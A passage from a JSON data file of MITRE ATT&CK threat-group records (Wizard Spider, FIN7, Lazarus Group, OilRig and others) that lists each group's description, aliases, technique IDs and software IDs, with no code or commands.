        "T1583",
        "T1070.001",
        "T1562.001",
        "T1074.001",
        "T1021.001",
        "T1555.005",
        "T1590",
        "T1059.001",
        "T1078.002",
        "T1552.001",
        "T1567.002",
        "T1059.003",
        "T1484.001",
        "T1047",
        "T1078",
        "T1486",
        "T1136.001",
        "T1018",
        "T1059.007",
        "T1585.002",
        "T1105",
        "T1489",
        "T1012",
        "T1558.003",
        "T1204.002",
        "T1021.004",
        "T1584.004"
      ],
      "software": [
        "S0695",
        "S0002",
        "S0363",
        "S0029",
        "S0384",
        "S0612",
        "S0570",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G0119",
      "stix_id": "intrusion-set--01e28736-2ffc-455b-9880-ed4d1407ae07",
      "created": "2021-01-06T17:46:35.134000+00:00",
      "modified": "2024-10-28T19:11:56.485000+00:00"
    },
    "G1014": {
      "id": "G1014",
      "name": "LuminousMoth",
      "description": "[LuminousMoth](https://attack.mitre.org/groups/G1014) is a Chinese-speaking cyber espionage group that has been active since at least October 2020. [LuminousMoth](https://attack.mitre.org/groups/G1014) has targeted high-profile organizations, including government entities, in Myanmar, the Philippines, Thailand, and other parts of Southeast Asia. Some security researchers have concluded there is a connection between [LuminousMoth](https://attack.mitre.org/groups/G1014) and [Mustang Panda](https://attack.mitre.org/groups/G0129) based on similar targeting and TTPs, as well as network infrastructure overlaps.(Citation: Kaspersky LuminousMoth July 2021)(Citation: Bitdefender LuminousMoth July 2021)",
      "aliases": [
        "LuminousMoth"
      ],
      "techniques": [
        "T1539",
        "T1567.002",
        "T1566.002",
        "T1588.001",
        "T1030",
        "T1564.001",
        "T1608.001",
        "T1091",
        "T1041",
        "T1608.004",
        "T1608.005",
        "T1587.001",
        "T1071.001",
        "T1105",
        "T1557.002",
        "T1588.002",
        "T1005",
        "T1204.001",
        "T1574.001",
        "T1547.001",
        "T1083",
        "T1033",
        "T1560",
        "T1036.005",
        "T1112",
        "T1053.005",
        "T1588.004",
        "T1553.002"
      ],
      "software": [
        "S0013",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G1014",
      "stix_id": "intrusion-set--b7f627e2-0817-4cd5-8d50-e75f8aa85cc6",
      "created": "2023-02-23T15:31:38.829000+00:00",
      "modified": "2025-04-16T20:37:32.806000+00:00"
    },
    "G0102": {
      "id": "G0102",
      "name": "Wizard Spider",
      "description": "[Wizard Spider](https://attack.mitre.org/groups/G0102) is a Russia-based financially motivated threat group originally known for the creation and deployment of [TrickBot](https://attack.mitre.org/software/S0266) since at least 2016. [Wizard Spider](https://attack.mitre.org/groups/G0102) possesses a diverse arsenal of tools and has conducted ransomware campaigns against a variety of organizations, ranging from major corporations to hospitals.(Citation: CrowdStrike Ryuk January 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: CrowdStrike Wizard Spider October 2020)",
      "aliases": [
        "Wizard Spider",
        "UNC1878",
        "TEMP.MixMaster",
        "Grim Spider",
        "FIN12",
        "GOLD BLACKBURN",
        "ITG23",
        "Periwinkle Tempest",
        "DEV-0193"
      ],
      "techniques": [
        "T1136.001",
        "T1588.003",
        "T1210",
        "T1560.001",
        "T1059.003",
        "T1047",
        "T1588.002",
        "T1543.003",
        "T1021.002",
        "T1074",
        "T1078.002",
        "T1055",
        "T1021",
        "T1021.001",
        "T1550.002",
        "T1222.001",
        "T1570",
        "T1204.002",
        "T1053.005",
        "T1027.010",
        "T1070.004",
        "T1552.006",
        "T1048.003",
        "T1518.001",
        "T1218.011",
        "T1558.003",
        "T1059.001",
        "T1567.002",
        "T1112",
        "T1490",
        "T1133",
        "T1547.004",
        "T1036.004",
        "T1087.002",
        "T1518",
        "T1071.001",
        "T1553.002",
        "T1136.002",
        "T1074.001",
        "T1557.001",
        "T1105",
        "T1003.003",
        "T1016",
        "T1585.002",
        "T1033",
        "T1078",
        "T1204.001",
        "T1003.001",
        "T1041",
        "T1566.001",
        "T1003.002",
        "T1489",
        "T1566.002",
        "T1562.001",
        "T1018",
        "T1005",
        "T1082",
        "T1555.004",
        "T1135",
        "T1569.002",
        "T1547.001",
        "T1021.006",
        "T1055.001",
        "T1197"
      ],
      "software": [
        "S0552",
        "S0190",
        "S0521",
        "S0097",
        "S0349",
        "S0359",
        "S1071",
        "S0002",
        "S0039",
        "S0363",
        "S0029",
        "S0266",
        "S0534",
        "S0632",
        "S0024",
        "S0446",
        "S0575",
        "S0367",
        "S0504",
        "S0659",
        "S0154"
      ],
      "url": "https://attack.mitre.org/groups/G0102",
      "stix_id": "intrusion-set--dd2d9ca6-505b-4860-a604-233685b802c7",
      "created": "2020-05-12T18:15:29.396000+00:00",
      "modified": "2025-03-12T20:33:21.597000+00:00"
    },
    "G0066": {
      "id": "G0066",
      "name": "Elderwood",
      "description": "[Elderwood](https://attack.mitre.org/groups/G0066) is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora. (Citation: Security Affairs Elderwood Sept 2012) The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers. (Citation: Symantec Elderwood Sept 2012) (Citation: CSM Elderwood Sept 2012)",
      "aliases": [
        "Elderwood",
        "Elderwood Gang",
        "Beijing Group",
        "Sneaky Panda"
      ],
      "techniques": [
        "T1027.013",
        "T1204.002",
        "T1566.002",
        "T1566.001",
        "T1204.001",
        "T1189",
        "T1203",
        "T1105",
        "T1027.002"
      ],
      "software": [
        "S0012",
        "S0205",
        "S0204",
        "S0203",
        "S0211",
        "S0210",
        "S0207",
        "S0206",
        "S0208"
      ],
      "url": "https://attack.mitre.org/groups/G0066",
      "stix_id": "intrusion-set--03506554-5f37-4f8f-9ce4-0e9f01a1b484",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.587000+00:00"
    },
    "G0046": {
      "id": "G0046",
      "name": "FIN7",
      "description": "[FIN7](https://attack.mitre.org/groups/G0046) is a financially-motivated threat group that has been active since 2013. [FIN7](https://attack.mitre.org/groups/G0046) has primarily targeted the retail, restaurant, hospitality, software, consulting, financial services, medical equipment, cloud services, media, food and beverage, transportation, and utilities industries in the U.S. A portion of [FIN7](https://attack.mitre.org/groups/G0046) was run out of a front company called Combi Security and often used point-of-sale malware for targeting efforts. Since 2020, [FIN7](https://attack.mitre.org/groups/G0046) shifted operations to a big game hunting (BGH) approach including use of [REvil](https://attack.mitre.org/software/S0496) ransomware and their own Ransomware as a Service (RaaS), Darkside. FIN7 may be linked to the [Carbanak](https://attack.mitre.org/groups/G0008) Group, but there appears to be several groups using [Carbanak](https://attack.mitre.org/software/S0030) malware and are therefore tracked separately.(Citation: FireEye FIN7 March 2017)(Citation: FireEye FIN7 April 2017)(Citation: FireEye CARBANAK June 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: CrowdStrike Carbon Spider August 2021)(Citation: Mandiant FIN7 Apr 2022)",
      "aliases": [
        "FIN7",
        "GOLD NIAGARA",
        "ITG14",
        "Carbon Spider",
        "ELBRUS",
        "Sangria Tempest"
      ],
      "techniques": [
        "T1204.001",
        "T1553.002",
        "T1078",
        "T1059",
        "T1021.004",
        "T1190",
        "T1027.016",
        "T1033",
        "T1053.005",
        "T1021.005",
        "T1036.005",
        "T1566.002",
        "T1036.004",
        "T1218.011",
        "T1047",
        "T1059.005",
        "T1219",
        "T1059.001",
        "T1546.011",
        "T1559.002",
        "T1069.002",
        "T1021.001",
        "T1674",
        "T1486",
        "T1588.002",
        "T1583.006",
        "T1497.002",
        "T1059.007",
        "T1547.001",
        "T1608.004",
        "T1125",
        "T1571",
        "T1027.010",
        "T1204.002",
        "T1218.005",
        "T1102.002",
        "T1105",
        "T1078.003",
        "T1583.001",
        "T1005",
        "T1543.003",
        "T1091",
        "T1071.004",
        "T1059.003",
        "T1566.001",
        "T1608.001",
        "T1008",
        "T1558.003",
        "T1195.002",
        "T1113",
        "T1567.002",
        "T1210",
        "T1587.001"
      ],
      "software": [
        "S0002",
        "S0552",
        "S0194",
        "S0488",
        "S0417",
        "S0648",
        "S0151",
        "S0496",
        "S0030",
        "S0517",
        "S0154",
        "S0449",
        "S0145",
        "S0416",
        "S0390",
        "S0681",
        "S0146",
        "S0415"
      ],
      "url": "https://attack.mitre.org/groups/G0046",
      "stix_id": "intrusion-set--3753cc21-2dae-4dfb-8481-d004e74502cc",
      "created": "2017-05-31T21:32:09.460000+00:00",
      "modified": "2024-04-17T22:09:41.004000+00:00"
    },
    "G1047": {
      "id": "G1047",
      "name": "Velvet Ant",
      "description": "[Velvet Ant](https://attack.mitre.org/groups/G1047) is a threat actor operating since at least 2021. [Velvet Ant](https://attack.mitre.org/groups/G1047) is associated with complex persistence mechanisms, the targeting of network devices and appliances during operations, and the use of zero day exploits.(Citation: Sygnia VelvetAnt 2024A)(Citation: Sygnia VelvetAnt 2024B)",
      "aliases": [
        "Velvet Ant"
      ],
      "techniques": [
        "T1090.001",
        "T1574.001",
        "T1132",
        "T1562.001",
        "T1047",
        "T1059.004",
        "T1571",
        "T1133",
        "T1570",
        "T1040",
        "T1083",
        "T1573.002",
        "T1569.002",
        "T1049",
        "T1037.004",
        "T1055",
        "T1071",
        "T1211",
        "T1078.003",
        "T1036.005",
        "T1021.002",
        "T1562.004"
      ],
      "software": [
        "S0357",
        "S0013"
      ],
      "url": "https://attack.mitre.org/groups/G1047",
      "stix_id": "intrusion-set--e1fc262c-dad2-4b82-abda-5f08dd134971",
      "created": "2025-03-14T19:21:17.470000+00:00",
      "modified": "2025-04-04T17:24:17.983000+00:00"
    },
    "G0090": {
      "id": "G0090",
      "name": "WIRTE",
      "description": "[WIRTE](https://attack.mitre.org/groups/G0090) is a threat group that has been active since at least August 2018. [WIRTE](https://attack.mitre.org/groups/G0090) has targeted government, diplomatic, financial, military, legal, and technology organizations in the Middle East and Europe.(Citation: Lab52 WIRTE Apr 2019)(Citation: Kaspersky WIRTE November 2021)",
      "aliases": [
        "WIRTE"
      ],
      "techniques": [
        "T1059.001",
        "T1571",
        "T1059.005",
        "T1204.002",
        "T1140",
        "T1566.001",
        "T1036.005",
        "T1588.002",
        "T1071.001",
        "T1218.010",
        "T1105"
      ],
      "software": [
        "S0363",
        "S0680",
        "S0679"
      ],
      "url": "https://attack.mitre.org/groups/G0090",
      "stix_id": "intrusion-set--f8cb7b36-62ef-4488-8a6d-a7033e3271c1",
      "created": "2019-05-24T17:02:44.226000+00:00",
      "modified": "2025-04-16T20:37:32.959000+00:00"
    },
    "G0035": {
      "id": "G0035",
      "name": "Dragonfly",
      "description": "[Dragonfly](https://attack.mitre.org/groups/G0035) is a cyber espionage group that has been attributed to Russia's Federal Security Service (FSB) Center 16.(Citation: DOJ Russia Targeting Critical Infrastructure March 2022)(Citation: UK GOV FSB Factsheet April 2022) Active since at least 2010, [Dragonfly](https://attack.mitre.org/groups/G0035) has targeted defense and aviation companies, government entities, companies related to industrial control systems, and critical infrastructure sectors worldwide through supply chain, spearphishing, and drive-by compromise attacks.(Citation: Symantec Dragonfly)(Citation: Secureworks IRON LIBERTY July 2019)(Citation: Symantec Dragonfly Sept 2017)(Citation: Fortune Dragonfly 2.0 Sept 2017)(Citation: Gigamon Berserk Bear October 2021)(Citation: CISA AA20-296A Berserk Bear December 2020)(Citation: Symantec Dragonfly 2.0 October 2017)",
      "aliases": [
        "Dragonfly",
        "TEMP.Isotope",
        "DYMALLOY",
        "Berserk Bear",
        "TG-4192",
        "Crouching Yeti",
        "IRON LIBERTY",
        "Energetic Bear",
        "Ghost Blizzard",
        "BROMINE"
      ],
      "techniques": [
        "T1560",
        "T1113",
        "T1564.002",
        "T1505.003",
        "T1204.002",
        "T1591.002",
        "T1078",
        "T1016",
        "T1584.004",
        "T1083",
        "T1136.001",
        "T1221",
        "T1203",
        "T1110.002",
        "T1608.004",
        "T1562.004",
        "T1012",
        "T1566.001",
        "T1189",
        "T1583.001",
        "T1003.002",
        "T1598.002",
        "T1070.001",
        "T1005",
        "T1070.004",
        "T1059",
        "T1112",
        "T1588.002",
        "T1195.002",
        "T1036.010",
        "T1003.003",
        "T1098.007",
        "T1583.003",
        "T1059.003",
        "T1071.002",
        "T1598.003",
        "T1053.005",
        "T1069.002",
        "T1114.002",
        "T1595.002",
        "T1547.001",
        "T1105",
        "T1133",
        "T1003.004",
        "T1190",
        "T1135",
        "T1110",
        "T1021.001",
        "T1187",
        "T1033",
        "T1074.001",
        "T1059.001",
        "T1210",
        "T1059.006",
        "T1018",
        "T1087.002"
      ],
      "software": [
        "S0500",
        "S0039",
        "S0357",
        "S0488",
        "S0075",
        "S0002",
        "S0029",
        "S0108",
        "S0093",
        "S0094"
      ],
      "url": "https://attack.mitre.org/groups/G0035",
      "stix_id": "intrusion-set--1c63d4ec-0a75-4daa-b1df-0d11af3d3cc1",
      "created": "2017-05-31T21:32:05.217000+00:00",
      "modified": "2024-01-08T20:40:31.822000+00:00"
    },
    "G0049": {
      "id": "G0049",
      "name": "OilRig",
      "description": "[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. The group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig April 2017)(Citation: ClearSky OilRig Jan 2017)(Citation: Palo Alto OilRig May 2016)(Citation: Palo Alto OilRig Oct 2016)(Citation: Unit42 OilRig Playbook 2023)(Citation: Unit 42 QUADAGENT July 2018)",
      "aliases": [
        "OilRig",
        "COBALT GYPSY",
        "IRN2",
        "APT34",
        "Helix Kitten",
        "Evasive Serpens",
        "Hazel Sandstorm",
        "EUROPIUM",
        "ITG13",
        "Earth Simnavaz",
        "Crambus",
        "TA452"
      ],
      "techniques": [
        "T1588.003",
        "T1555.004",
        "T1082",
        "T1003.001",
        "T1008",
        "T1071.001",
        "T1005",
        "T1059.003",
        "T1021.001",
        "T1505.003",
        "T1587.001",
        "T1608.001",
        "T1036",
        "T1219",
        "T1218.001",
        "T1046",
        "T1087.001",
        "T1137.004",
        "T1069.002",
        "T1113",
        "T1025",
        "T1007",
        "T1556.002",
        "T1059.001",
        "T1070.004",
        "T1588.002",
        "T1204.002",
        "T1133",
        "T1078.002",
        "T1201",
        "T1586.002",
        "T1087.002",
        "T1003.004",
        "T1140",
        "T1553.002",
        "T1048.003",
        "T1110",
        "T1059.005",
        "T1566.002",
        "T1112",
        "T1120",
        "T1071.004",
        "T1105",
        "T1049",
        "T1543.003",
        "T1195",
        "T1204.001",
        "T1078",
        "T1573.002",
        "T1562.004",
        "T1566.001",
        "T1053.005",
        "T1119",
        "T1583.001",
        "T1056.001",
        "T1036.005",
        "T1033",
        "T1566.003",
        "T1572",
        "T1047",
        "T1021.004",
        "T1555",
        "T1115",
        "T1003.005",
        "T1027.013",
        "T1069.001",
        "T1552.001",
        "T1057",
        "T1555.003",
        "T1016",
        "T1203",
        "T1012",
        "T1059",
        "T1497.001",
        "T1068",
        "T1027.005",
        "T1105",
        "T1584.004",
        "T1217",
        "T1071.001",
        "T1585.003",
        "T1027.013",
        "T1587.001",
        "T1059.005",
        "T1140",
        "T1217",
        "T1053.005",
        "T1132.001",
        "T1518",
        "T1071.001",
        "T1059.001",
        "T1074.001",
        "T1082",
        "T1587.001",
        "T1555.004",
        "T1059.005",
        "T1584.004",
        "T1555.003"
      ],
      "software": [
        "S0096",
        "S0508",
        "S0057",
        "S0039",
        "S0160",
        "S0075",
        "S0104",
        "S0100",
        "S0349",
        "S0029",
        "S0002",
        "S0095",
        "S0189",
        "S1170",
        "S0495",
        "S0269",
        "S0264",
        "S1151",
        "S0184",
        "S1166",
        "S0360",
        "S0610",
        "S0170",
        "S1169",
        "S1172",
        "S1168",
        "S0185",
        "S1173",
        "S1171",
        "S0258",
        "S1166",
        "S1168",
        "S1169"
      ],
      "url": "https://attack.mitre.org/groups/G0049",
      "stix_id": "intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-01-16T18:55:49.463000+00:00"
    },
    "G0020": {
      "id": "G0020",
      "name": "Equation",
      "description": "[Equation](https://attack.mitre.org/groups/G0020) is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives. (Citation: Kaspersky Equation QA)",
      "aliases": [
        "Equation"
      ],
      "techniques": [
        "T1564.005",
        "T1120",
        "T1480.001",
        "T1542.002"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0020",
      "stix_id": "intrusion-set--96e239be-ad99-49eb-b127-3007b8c1bec9",
      "created": "2017-05-31T21:31:54.697000+00:00",
      "modified": "2025-04-25T14:48:45.400000+00:00"
    },
    "G0117": {
      "id": "G0117",
      "name": "Fox Kitten",
      "description": "[Fox Kitten](https://attack.mitre.org/groups/G0117) is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. [Fox Kitten](https://attack.mitre.org/groups/G0117) has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering.(Citation: ClearkSky Fox Kitten February 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: Dragos PARISITE )(Citation: ClearSky Pay2Kitten December 2020)",
      "aliases": [
        "Fox Kitten",
        "UNC757",
        "Parisite",
        "Pioneer Kitten",
        "RUBIDIUM",
        "Lemon Sandstorm"
      ],
      "techniques": [
        "T1105",
        "T1059",
        "T1530",
        "T1018",
        "T1110",
        "T1210",
        "T1136.001",
        "T1560.001",
        "T1027.010",
        "T1005",
        "T1585",
        "T1021.005",
        "T1552.001",
        "T1217",
        "T1059.003",
        "T1027.013",
        "T1213.005",
        "T1021.002",
        "T1190",
        "T1555.005",
        "T1003.003",
        "T1087.001",
        "T1087.002",
        "T1021.004",
        "T1505.003",
        "T1053.005",
        "T1036.004",
        "T1003.001",
        "T1090",
        "T1012",
        "T1572",
        "T1021.001",
        "T1102",
        "T1039",
        "T1078",
        "T1046",
        "T1546.008",
        "T1585.001",
        "T1036.005",
        "T1059.001",
        "T1083"
      ],
      "software": [
        "S0508",
        "S0029",
        "S0020",
        "S0556"
      ],
      "url": "https://attack.mitre.org/groups/G0117",
      "stix_id": "intrusion-set--c21dd6f1-1364-4a70-a1f7-783080ec34ee",
      "created": "2020-12-21T21:49:47.307000+00:00",
      "modified": "2024-01-08T22:00:34.410000+00:00"
    },
    "G0032": {
      "id": "G0032",
      "name": "Lazarus Group",
      "description": "[Lazarus Group](https://attack.mitre.org/groups/G0032) is a North Korean state-sponsored cyber threat group that has been attributed to the Reconnaissance General Bureau.(Citation: US-CERT HIDDEN COBRA June 2017)(Citation: Treasury North Korean Cyber Groups September 2019) The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by [Lazarus Group](https://attack.mitre.org/groups/G0032) correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain.(Citation: Novetta Blockbuster)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups, such as [Andariel](https://attack.mitre.org/groups/G0138), [APT37](https://attack.mitre.org/groups/G0067), [APT38](https://attack.mitre.org/groups/G0082), and [Kimsuky](https://attack.mitre.org/groups/G0094).   ",
      "aliases": [
        "Lazarus Group",
        "Labyrinth Chollima",
        "HIDDEN COBRA",
        "Guardians of Peace",
        "ZINC",
        "NICKEL ACADEMY",
        "Diamond Sleet"
      ],
      "techniques": [
        "T1059.003",
        "T1566.001",
        "T1202",
        "T1048.003",
        "T1001.003",
        "T1584.004",
        "T1105",
        "T1218.005",
        "T1010",
        "T1587.001",
        "T1134.002",
        "T1021.004",
        "T1098",
        "T1564.001",
        "T1485",
        "T1591",
        "T1106",
        "T1078",
        "T1027.009",
        "T1012",
        "T1090.002",
        "T1027.013",
        "T1104",
        "T1046",
        "T1005",
        "T1489",
        "T1016",
        "T1588.004",
        "T1573.001",
        "T1082",
        "T1033",
        "T1620",
        "T1041",
        "T1102.002",
        "T1560",
        "T1203",
        "T1059.001",
        "T1566.002",
        "T1074.001",
        "T1036.003",
        "T1047",
        "T1071.001",
        "T1557.001",
        "T1057",
        "T1547.001",
        "T1589.002",
        "T1561.001",
        "T1491.001",
        "T1588.002",
        "T1547.009",
        "T1059.005",
        "T1542.003",
        "T1218.011",
        "T1583.006",
        "T1056.001",
        "T1571",
        "T1132.001",
        "T1189",
        "T1110.003",
        "T1204.002",
        "T1553.002",
        "T1218",
        "T1560.002",
        "T1027.007",
        "T1070.004",
        "T1090.001",
        "T1008",
        "T1140",
        "T1562.001",
        "T1561.002",
        "T1583.001",
        "T1562.004",
        "T1053.005",
        "T1566.003",
        "T1036.005",
        "T1070",
        "T1083",
        "T1574.013",
        "T1055.001",
        "T1585.001",
        "T1021.001",
        "T1529",
        "T1124",
        "T1036.004",
        "T1070.006",
        "T1070.003",
        "T1574.001",
        "T1543.003",
        "T1021.002",
        "T1585.002",
        "T1049",
        "T1560.003",
        "T1614.001",
        "T1608.001",
        "T1218.011",
        "T1106",
        "T1585.001",
        "T1036.008",
        "T1070.004",
        "T1547.001",
        "T1497.001",
        "T1059.005",
        "T1608.002",
        "T1105",
        "T1585.002",
        "T1584.001",
        "T1583.004",
        "T1573.001",
        "T1204.001",
        "T1059.001",
        "T1591",
        "T1583.001",
        "T1221",
        "T1497.003",
        "T1589",
        "T1553.002",
        "T1005",
        "T1110",
        "T1041",
        "T1534",
        "T1583.006",
        "T1566.003",
        "T1591.004",
        "T1053.005",
        "T1204.002",
        "T1588.003",
        "T1656",
        "T1087.002",
        "T1587.002",
        "T1566.001",
        "T1505.004",
        "T1083",
        "T1218.010",
        "T1047",
        "T1027.002",
        "T1588.002",
        "T1071.001",
        "T1567.002",
        "T1622",
        "T1027.013",
        "T1220",
        "T1587.001",
        "T1059.003",
        "T1584.004",
        "T1593.001",
        "T1566.002",
        "T1560.001"
      ],
      "software": [
        "S0364",
        "S0108",
        "S0103",
        "S0174",
        "S0238",
        "S0245",
        "S0181",
        "S0366",
        "S1182",
        "S0376",
        "S0263",
        "S0567",
        "S0431",
        "S0246",
        "S0497",
        "S0271",
        "S0586",
        "S0347",
        "S0593",
        "S0584",
        "S0520",
        "S0665",
        "S0180",
        "S0498",
        "S0241",
        "S0239",
        "S0174",
        "S0678",
        "S0694"
      ],
      "url": "https://attack.mitre.org/groups/G0032",
      "stix_id": "intrusion-set--c93fccb1-e8e8-42cf-ae33-2ad1d183913a",
      "created": "2017-05-31T21:32:03.807000+00:00",
      "modified": "2025-04-16T17:21:11.622000+00:00"
    },
    "G0143": {
      "id": "G0143",
      "name": "Aquatic Panda",
      "description": "[Aquatic Panda](https://attack.mitre.org/groups/G0143) is a suspected China-based threat group with a dual mission of intelligence collection and industrial espionage. Active since at least May 2020, [Aquatic Panda](https://attack.mitre.org/groups/G0143) has primarily targeted entities in the telecommunications, technology, and government sectors.(Citation: CrowdStrike AQUATIC PANDA December 2021)",
      "aliases": [
        "Aquatic Panda"
      ],
      "techniques": [
        "T1027.010",
        "T1087",
        "T1070.004",
        "T1059.004",
        "T1021.002",
        "T1036.004",
        "T1574.006",
        "T1070.003",
        "T1543.003",
        "T1550.002",
        "T1574.001",
        "T1021.001",
        "T1005",
        "T1070.001",
        "T1105",
        "T1007",
        "T1654",
        "T1021.004",
        "T1112",
        "T1036.005",
        "T1588.001",
        "T1518.001",
        "T1059.003",
        "T1562.001",
        "T1033",
        "T1047",
        "T1588.002",
        "T1595.002",
        "T1003.001",
        "T1021",
        "T1082",
        "T1218.011",
        "T1078.002",
        "T1560.001",
        "T1059.001"
      ],
      "software": [
        "S0645",
        "S0141",
        "S0385",
        "S0154",
        "S0596",
        "S0430"
      ],
      "url": "https://attack.mitre.org/groups/G0143",
      "stix_id": "intrusion-set--64b52e7d-b2c4-4a02-9372-08a463f5dc11",
      "created": "2022-01-18T14:49:29.505000+00:00",
      "modified": "2024-10-10T14:31:59.099000+00:00"
    },
    "G1034": {
      "id": "G1034",
      "name": "Daggerfly",
      "description": "[Daggerfly](https://attack.mitre.org/groups/G1034) is a People's Republic of China-linked APT entity active since at least 2012. [Daggerfly](https://attack.mitre.org/groups/G1034) has targeted individuals, government and NGO entities, and telecommunication companies in Asia and Africa. [Daggerfly](https://attack.mitre.org/groups/G1034) is associated with exclusive use of [MgBot](https://attack.mitre.org/software/S1146) malware and is noted for several potential supply chain infection campaigns.(Citation: Symantec Daggerfly 2023)(Citation: ESET EvasivePanda 2023)(Citation: Symantec Daggerfly 2024)(Citation: ESET EvasivePanda 2024)",
      "aliases": [
        "Daggerfly",
        "Evasive Panda",
        "BRONZE HIGHLAND"
      ],
      "techniques": [
        "T1003.002",
        "T1587.002",
        "T1053.005",
        "T1071.001",
        "T1059.001",
        "T1036.003",
        "T1204.001",
        "T1105",
        "T1082",
        "T1195.002",
        "T1574.001",
        "T1218.011",
        "T1584.004",
        "T1136.001",
        "T1553.002",
        "T1012",
        "T1189"
      ],
      "software": [
        "S0190",
        "S0075",
        "S0013",
        "S1146",
        "S1016",
        "S1147"
      ],
      "url": "https://attack.mitre.org/groups/G1034",
      "stix_id": "intrusion-set--f3be6240-f68e-47e1-90d2-ad8f3b3bb8a6",
      "created": "2024-07-25T17:13:06.098000+00:00",
      "modified": "2024-10-31T18:33:10.434000+00:00"
    },
    "G0092": {
      "id": "G0092",
      "name": "TA505",
      "description": "[TA505](https://attack.mitre.org/groups/G0092) is a cyber criminal group that has been active since at least 2014. [TA505](https://attack.mitre.org/groups/G0092) is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware campaigns involving [Clop](https://attack.mitre.org/software/S0611).(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: NCC Group TA505)(Citation: Korean FSI TA505 2020)",
      "aliases": [
        "TA505",
        "Hive0065",
        "Spandex Tempest",
        "CHIMBORAZO"
      ],
      "techniques": [
        "T1087.003",
        "T1583.001",
        "T1553.005",
        "T1218.007",
        "T1112",
        "T1588.002",
        "T1204.002",
        "T1568.001",
        "T1027.013",
        "T1027.002",
        "T1552.001",
        "T1059.005",
        "T1059.007",
        "T1204.001",
        "T1562.001",
        "T1608.001",
        "T1218.011",
        "T1140",
        "T1555.003",
        "T1027.010",
        "T1069",
        "T1105",
        "T1588.001",
        "T1078.002",
        "T1553.002",
        "T1486",
        "T1059.001",
        "T1566.001",
        "T1106",
        "T1566.002",
        "T1559.002",
        "T1055.001",
        "T1071.001",
        "T1059.003"
      ],
      "software": [
        "S0552",
        "S0002",
        "S0521",
        "S0039",
        "S0194",
        "S0611",
        "S0344",
        "S0381",
        "S0384",
        "S0266",
        "S0460",
        "S0383",
        "S0154",
        "S0382",
        "S1025",
        "S0461"
      ],
      "url": "https://attack.mitre.org/groups/G0092",
      "stix_id": "intrusion-set--7eda3dd8-b09b-4705-8090-c2ad9fb8c14d",
      "created": "2019-05-28T15:54:17.213000+00:00",
      "modified": "2024-04-10T22:37:02.592000+00:00"
    },
    "G0100": {
      "id": "G0100",
      "name": "Inception",
      "description": "[Inception](https://attack.mitre.org/groups/G0100) is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East.(Citation: Unit 42 Inception November 2018)(Citation: Symantec Inception Framework March 2018)(Citation: Kaspersky Cloud Atlas December 2014)",
      "aliases": [
        "Inception",
        "Inception Framework",
        "Cloud Atlas"
      ],
      "techniques": [
        "T1027.013",
        "T1588.002",
        "T1547.001",
        "T1102",
        "T1090.003",
        "T1518",
        "T1083",
        "T1566.001",
        "T1082",
        "T1059.001",
        "T1204.002",
        "T1071.001",
        "T1005",
        "T1218.005",
        "T1555.003",
        "T1203",
        "T1069.002",
        "T1059.005",
        "T1221",
        "T1218.010",
        "T1573.001",
        "T1057"
      ],
      "software": [
        "S0349",
        "S0441",
        "S0442"
      ],
      "url": "https://attack.mitre.org/groups/G0100",
      "stix_id": "intrusion-set--ead23196-d7b6-4ce6-a124-4ab4b67d81bd",
      "created": "2020-05-08T17:01:04.058000+00:00",
      "modified": "2024-04-11T02:15:23.096000+00:00"
    },
    "G0018": {
      "id": "G0018",
      "name": "admin@338",
      "description": "[admin@338](https://attack.mitre.org/groups/G0018) is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as [PoisonIvy](https://attack.mitre.org/software/S0012), as well as some non-public backdoors. (Citation: FireEye admin@338)",
      "aliases": [
        "admin@338"
      ],
      "techniques": [
        "T1566.001",
        "T1016",
        "T1036.005",
        "T1083",
        "T1069.001",
        "T1049",
        "T1087.001",
        "T1203",
        "T1007",
        "T1204.002",
        "T1082",
        "T1059.003"
      ],
      "software": [
        "S0096",
        "S0039",
        "S0104",
        "S0100",
        "S0043",
        "S0042",
        "S0012"
      ],
      "url": "https://attack.mitre.org/groups/G0018",
      "stix_id": "intrusion-set--16ade1aa-0ea1-4bb7-88cc-9079df2ae756",
      "created": "2017-05-31T21:31:53.579000+00:00",
      "modified": "2025-04-25T14:48:47.886000+00:00"
    },
    "G0098": {
      "id": "G0098",
      "name": "BlackTech",
